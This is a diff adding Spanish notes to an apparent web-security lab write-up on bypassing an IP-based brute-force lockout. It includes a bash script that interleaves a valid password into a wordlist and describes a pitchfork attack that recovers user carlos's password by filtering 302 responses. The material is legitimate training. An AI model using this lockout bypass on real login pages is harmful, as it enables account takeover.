@@ -160,10 +160,42 @@ NO es como que pruebe cada uno de los passwords para cada uno de los usuarios NO
 
 # Broken brute-force protection, IP block
 
-Para este laboratorio nos dirigimos al login y nos percatamos que nos bloquea 
+Para este laboratorio nos dirigimos al login y nos percatamos que nos bloquea al tercer intento pero si el tercer intento metemos 
+unas credenciales validas nos permite continuar entonces creamos una lista con los passwords sugeridos en este lab
+
+```bash
+#!/bin/bash
 
 
+i=0
 
+for j in $(cat lista.txt); do 
+
+
+if [ $i -eq 1 ]
+	then
+	echo "peter" >> lista2.txt
+	i=0
+fi
+
+i=$((i+1))
+
+echo $j  >> lista2.txt
+
+done
+
+```
+
+Despues creamos una lista de usuarios de modo que weiner y carlos queden en ese orden ya que vamos a usar el ataque PitchFork
+
+Este tipo de ataque funciona asi 
+```
+User1:Password1
+User2:Password2
+
+```
+Y como vimos cuando el usuario es correcto nos regresa un codigo 302 y cuando no un 200 entonces filtramos por el 302 y enocntramos el 
+password del usuario carlos.
 
 
 
